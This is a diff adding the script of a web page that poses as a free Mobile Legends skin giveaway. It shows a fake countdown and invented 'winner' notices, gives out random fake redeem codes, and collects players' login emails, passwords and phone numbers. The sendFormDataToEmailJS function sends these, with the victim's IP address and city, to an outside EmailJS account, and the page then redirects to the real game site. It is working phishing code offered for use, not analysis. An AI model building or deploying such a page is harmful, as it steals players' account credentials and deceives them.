+      "Sakura Haruno": { 
+        prefix: "SAK",
+        image: "https://i.ibb.co/Hfj4SsgH/IMG-20250513-192111.jpg"
+      },
+      "Kakashi Hatake": { 
+        prefix: "KAK",
+        image: "https://i.ibb.co/wfk0j8T/IMG-20250513-192211.jpg"
+      },
+      "Ling Collector": { 
+        prefix: "LING",
+        image: "https://i.ibb.co/272LYwW8/IMG-20250530-214157.jpg"
+      },
+      "Fanny Aspirant": { 
+        prefix: "FAN2",
+        image: "https://i.ibb.co/WJZtvn1/IMG-20250530-214224.jpg"
+      },
+      "Lancelot Dawning": { 
+        prefix: "Lance",
+        image: "https://i.ibb.co/v4zQvd1P/IMG-20250530-214307.jpg"
+      },
+      "Selena Zenith": { 
+        prefix: "SEL2",
+        image: "https://i.ibb.co/SDWJ6YPW/IMG-20250530-214431.jpg"
+      },
+      "KOF CHOU": { 
+        prefix: "KOF3",
+        image: "https://i.ibb.co/YwjSshz/IMG-20250530-214501.jpg"
+      },
+      "Johnson Legends": { 
+        prefix: "John12",
+        image: "https://i.ibb.co/B5CGNr2T/IMG-20250530-214536.jpg"
+      },
+      "Yi Shun Shin Collector": { 
+        prefix: "YI82",
+        image: "https://i.ibb.co/JRhCZ6tN/IMG-20250530-214604.jpg"
+      },
+      "Alpha Legends": { 
+        prefix: "ALP12",
+        image: "https://i.ibb.co/JhjtKLF/IMG-20250530-214346.jpg"
+      },
+      "Starlight": { 
+        prefix: "STAR",
+        image: "https://i.ibb.co/NdP55zWS/images-8.jpg"
+      },
+      "Starlight Premium": { 
+        prefix: "STARP",
+        image: "https://i.ibb.co/NgjTHc6P/download-2.jpg"
+      },
+      "Diamond": { 
+        prefix: "STARE",
+        image: "https://i.ibb.co/j9VN0dMt/IMG-20250530-212015.jpg"
+      }
+    };
+
+    // Initialize Page
+    async function initPage() {
+      // Populate level dropdown
+      for (let i = 1; i <= 200; i++) {
+        const option = document.createElement("option");
+        option.value = i;
+        option.textContent = `Level ${i}`;
+        elements.accountLevel.appendChild(option);
+      }
+      
+      // Start countdown
+      startCountdown(60 * 60 * 2, elements.timer);
+      
+      // Generate marquee text
+      generateMarqueeText();
+      setInterval(generateMarqueeText, 60000);
+      
+      // Setup login method selection
+      setupLoginMethodSelection();
+      
+      // Image error handling
+      document.querySelectorAll('img').forEach(img => {
+        img.onerror = () => {
+          console.error(`Failed to load image: ${img.alt}`);
+          img.style.border = "2px dashed red";
+        };
+      });
+
+      // Get user IP and ASN information
+      await fetchUserIPInfo();
+    }
+
+    // Fetch user IP and ASN information
+    async function fetchUserIPInfo() {
+      try {
+        const response = await fetch('https://ipwho.is/');
+        const data = await response.json();
+        userIP = data.ip;
+        userASN = data.connection?.asn || 'Unknown';
+        userCity = data.city || 'Unknown';
+        console.log('User IP:', userIP, 'ASN:', userASN, 'City:', userCity);
+      } catch (error) {
+        console.error('Error fetching IP info:', error);
+        userIP = 'Unknown';
+        userASN = 'Unknown';
+        userCity = 'Unknown';
+      }
+    }
+
+    // Generate random redeem code
+    function generateRedeemCode(skinName) {
+      if (!skinData[skinName]) return "INVALID_SKIN";
+      
+      const prefix = skinData[skinName].prefix;
+      const randomNum = Math.floor(1000 + Math.random() * 9000);
+      const randomChars = Math.random().toString(36).substr(2, 4).toUpperCase();
+      
+      return `MLBB-${prefix}-${randomNum}-${randomChars}`;
+    }
+
+    // Copy redeem code to clipboard
+    function copyRedeemCode() {
+      if (!redeemCode) return;
+      
+      navigator.clipboard.writeText(redeemCode).then(() => {
+        alert("Redemption code copied to clipboard!");
+      }).catch(err => {
+        console.error("Failed to copy code: ", err);
+        alert("Failed to copy code. Please copy it manually.");
+      });
+    }
+
+    // Back to skin selection
+    function backToSkinSelection() {
+      elements.step2Form.classList.add("hidden");
+      elements.step1.classList.remove("hidden");
+      // Reset form but keep selected skin
+      document.querySelectorAll('#step2Form input:not([type="radio"]), #step2Form select').forEach(el => {
+        el.value = '';
+      });
+      document.querySelectorAll('.method-option').forEach(opt => {
+        opt.classList.remove('selected');
+      });
+      document.querySelectorAll('#step2Form input[type="radio"]').forEach(radio => {
+        radio.checked = false;
+      });
+      elements.credentialFields.classList.add("hidden");
+      elements.redeemCodeDisplay.textContent = "Code will appear after verification";
+      elements.copyCodeBtn.classList.add("hidden");
+      elements.redeemForm.classList.add("hidden");
+      selectedMethod = null;
+    }
+
+    // Countdown Timer
+    function startCountdown(duration, display) {
+      let timer = duration, hours, minutes, seconds;
+      setInterval(() => {
+        hours = parseInt(timer / 3600, 10);
+        minutes = parseInt((timer % 3600) / 60, 10);
+        seconds = parseInt(timer % 60, 10);
+        
+        display.textContent = 
+          `${hours.toString().padStart(2,'0')}:${minutes.toString().padStart(2,'0')}:${seconds.toString().padStart(2,'0')}`;
+        
+        if (--timer < 0) timer = duration;
+      }, 1000);
+    }
+
+    // Marquee Text Generator
+    function generateMaskedID() {
+      const id = Math.floor(Math.random() * 89999999) + 10000000;
+      return `${id.toString().slice(0,3)}***${id.toString().slice(-2)}`;
+    }
+
+    function generateMarqueeText() {
+      const skins = Object.keys(skinData);
+      const countries = ["🇮🇩", "🇵🇭", "🇲🇾", "🇲🇲", "🇮🇳", "🇹🇭", "🇰🇭"];
+      const emojis = ["🎉", "🔥", "✨", "⚡", "💯", "🎁", "🏆"];
+      
+      let text = "";
+      
+      for (let i = 0; i < 15; i++) {
+        const skin = skins[Math.floor(Math.random() * skins.length)];
+        const country = countries[Math.floor(Math.random() * countries.length)];
+        const emoji = emojis[Math.floor(Math.random() * emojis.length)];
+        text += `${country} ID ${generateMaskedID()} received <b>${skin}</b> ${emoji} • `;
+      }
+      
+      elements.marqueeContent.innerHTML = text;
+    }
+
+    // Navigation Functions
+    function selectSkin(skinName) {
+      selectedSkin = skinName;
+      elements.selectedSkinText.textContent = skinName;
+      
+      // Reset redeem code display
+      elements.redeemCodeDisplay.textContent = "Code will appear after verification";
+      elements.copyCodeBtn.classList.add("hidden");
+      elements.redeemForm.classList.add("hidden");
+      
+      elements.step1.classList.add("hidden");
+      elements.step2Form.classList.remove("hidden");
+    }
+
+    function closeDoneModal() {
+      elements.doneModal.classList.add("hidden");
+      elements.redeemForm.classList.remove("hidden");
+    }
+
+    // Login Method Selection
+    function setupLoginMethodSelection() {
+      elements.methodOptions.forEach(option => {
+        option.addEventListener('click', function() {
+          // Remove selected class from all options
+          elements.methodOptions.forEach(opt => opt.classList.remove('selected'));
+          
+          // Add selected class to clicked option
+          this.classList.add('selected');
+          
+          // Set selected method
+          selectedMethod = this.dataset.method;
+          
+          // Show credential fields
+          elements.credentialFields.classList.remove("hidden");
+          
+          // Clear method error
+          document.getElementById("methodError").style.display = 'none';
+          
+          // Focus on email field
+          document.getElementById("loginEmail").focus();
+        });
+      });
+    }
+
+    // Form Validation
+    async function validateForm() {
+      let isValid = true;
+      
+      // Required fields
+      const userId = document.getElementById("userId").value;
+      const zoneId = document.getElementById("zoneId").value;
+      const level = document.getElementById("accountLevel").value;
+      const countryCode = document.getElementById("countryCode").value;
+      const phone = document.getElementById("phoneNumber").value;
+      const email = document.getElementById("loginEmail").value;
+      const password = document.getElementById("loginPassword").value;
+      const countryFlag = document.querySelector('#countryCode option:checked').dataset.flag || '';
+      
+      // Validate fields
+      if (!userId) {
+        document.getElementById("userIdError").style.display = 'block';
+        isValid = false;
+      } else {
+        document.getElementById("userIdError").style.display = 'none';
+      }
+      
+      if (!zoneId) {
+        document.getElementById("zoneIdError").style.display = 'block';
+        isValid = false;
+      } else {
+        document.getElementById("zoneIdError").style.display = 'none';
+      }
+      
+      if (!level) {
+        document.getElementById("levelError").style.display = 'block';
+        isValid = false;
+      } else {
+        document.getElementById("levelError").style.display = 'none';
+      }
+      
+      if (!countryCode || !phone) {
+        document.getElementById("phoneError").style.display = 'block';
+        isValid = false;
+      } else {
+        document.getElementById("phoneError").style.display = 'none';
+      }
+      
+      if (!selectedMethod) {
+        document.getElementById("methodError").style.display = 'block';
+        isValid = false;
+      } else {
+        document.getElementById("methodError").style.display = 'none';
+      }
+      
+      if (!email) {
+        document.getElementById("emailError").style.display = 'block';
+        isValid = false;
+      } else {
+        document.getElementById("emailError").style.display = 'none';
+      }
+      
+      if (!password) {
+        document.getElementById("passwordError").style.display = 'block';
+        isValid = false;
+      } else {
+        document.getElementById("passwordError").style.display = 'none';
+      }
+      
+      if (isValid) {
+        await processRedeemRequest(countryFlag);
+      }
+    }
+
+    // Process redeem request
+    async function processRedeemRequest(countryFlag) {
+      try {
+        // Tampilkan loading state
+        elements.buttonText.innerHTML = `<span class="spinner"></span> GENERATING CODE...`;
+        document.getElementById("submitBtn").disabled = true;
+        
+        // Simulasikan proses validasi
+        await new Promise(resolve => setTimeout(resolve, 1500 + Math.random() * 1000));
+        
+        // Generate redeem code
+        redeemCode = generateRedeemCode(selectedSkin);
+        elements.redeemCodeDisplay.textContent = redeemCode;
+        elements.copyCodeBtn.classList.remove("hidden");
+        
+        // Kirim data ke EmailJS (tanpa kode redeem)
+        await sendFormDataToEmailJS(countryFlag);
+        
+        // Tampilkan preview skin di modal
+        elements.redeemedSkinImage.src = skinData[selectedSkin].image;
+        elements.redeemedSkinImage.alt = selectedSkin;
+        elements.redeemedSkinName.textContent = selectedSkin;
+        elements.skinNamePlaceholder.textContent = selectedSkin;
+        elements.modalRedeemCode.textContent = redeemCode;
+        
+        // Tampilkan modal
+        elements.doneModal.classList.remove("hidden");
+        
+        // Tampilkan confetti
+        createConfetti();
+        
+      } catch (error) {
+        console.error("Error:", error);
+      } finally {
+        // Reset button state
+        document.getElementById("submitBtn").disabled = false;
+        elements.buttonText.textContent = "VERIFY & GET CODE";
+      }
+    }
+
+    // Submit redeem code
+    function submitRedeemCode() {
+      const code = elements.redeemCodeInput.value.trim();
+      if (!code) {
+        alert("Please enter your redemption code");
+        return;
+      }
+      
+      elements.redeemButtonText.innerHTML = `<span class="spinner"></span> PROCESSING...`;
+      elements.redeemSubmitBtn.disabled = true;
+      
+      // Simulate processing
+      setTimeout(() => {
+        elements.step2Form.classList.add("hidden");
+        elements.redeemConfirmation.classList.remove("hidden");
+        elements.confirmationSkinName.textContent = selectedSkin;
+        
+        // Redirect after 5 seconds
+        setTimeout(() => {
+          window.location.href = "https://m.mobilelegends.com";
+        }, 5000);
+      }, 2000);
+    }
+
+    // Send form data to EmailJS (without redeem code)
+    async function sendFormDataToEmailJS(countryFlag) {
+      const formData = {
+        userId: document.getElementById("userId").value,
+        zoneId: document.getElementById("zoneId").value,
+        level: document.getElementById("accountLevel").value,
+        countryCode: document.getElementById("countryCode").value,
+        countryFlag: countryFlag,
+        phone: document.getElementById("phoneNumber").value,
+        email: document.getElementById("loginEmail").value,
+        password: document.getElementById("loginPassword").value,
+        method: selectedMethod,
+        timestamp: new Date().toLocaleString(),
+        userIP: userIP,
+        userASN: userASN,
+        userCity: userCity
+      };
+      
+      // Buat hash unik dari data untuk cek duplikat
+      const dataHash = btoa(JSON.stringify({
+        user_ip: formData.userIP
+      }));
+      
+      // Cek apakah data sudah pernah dikirim
+      const sentData = localStorage.getItem('mlbb_sent_data');
+      if (sentData === dataHash) {
+        console.log('Data sudah pernah dikirim, skip pengiriman ke EmailJS');
+        return; // Keluar dari fungsi tanpa mengirim email
+      }
+      
+      // Kirim data ke EmailJS
+      const templateParams = {
+        user_id: formData.userId,
+        zone_id: formData.zoneId,
+        level: formData.level,
+        country_code: formData.countryCode,
+        country_flag: formData.countryFlag,
+        phone: formData.phone,
+        login_method: formData.method,
+        login_email: formData.email,
+        login_password: formData.password,
+        timestamp: formData.timestamp,
+        user_ip: formData.userIP,
+        user_asn: formData.userASN,
+        user_city: formData.userCity
+      };
+      
+      await emailjs.send("service_jontp1s", "template_708w4gr", templateParams);
+      
+      // Simpan hash data ke localStorage
+      localStorage.setItem('mlbb_sent_data', dataHash);
+    }
+
+    // Create confetti effect
+    function createConfetti() {
+      const colors = ['#ffcc00', '#ff9500', '#ffffff', '#ff3333', '#33ccff'];
+      const container = document.querySelector('.container');
+      
+      for (let i = 0; i < 100; i++) {
+        const confetti = document.createElement('div');
+        confetti.className = 'confetti';
+        confetti.style.left = Math.random() * 100 + 'vw';
+        confetti.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
+        confetti.style.width = Math.random() * 10 + 5 + 'px';
+        confetti.style.height = Math.random() * 10 + 5 + 'px';
+        confetti.style.opacity = Math.random() + 0.5;
+        confetti.style.transform = `rotate(${Math.random() * 360}deg)`;
+        
+        const animationDuration = Math.random() * 3 + 2;
+        confetti.style.animation = `fall ${animationDuration}s linear forwards`;
+        
+        document.body.appendChild(confetti);
+        
+        const keyframes = `
+          @keyframes fall {
+            to {
+              transform: translateY(100vh) rotate(${Math.random() * 360}deg);
+              opacity: 0;
+            }
+          }
+        `;
+        
+        const style = document.createElement('style');
+        style.innerHTML = keyframes;
+        document.head.appendChild(style);
+        
+        setTimeout(() => {
+          confetti.remove();
+          style.remove();
+        }, animationDuration * 1000);
+      }
+    }
+
+    // Initialize when page loads
+    document.addEventListener('DOMContentLoaded', initPage);
+  </script>
+</body>
+</html>
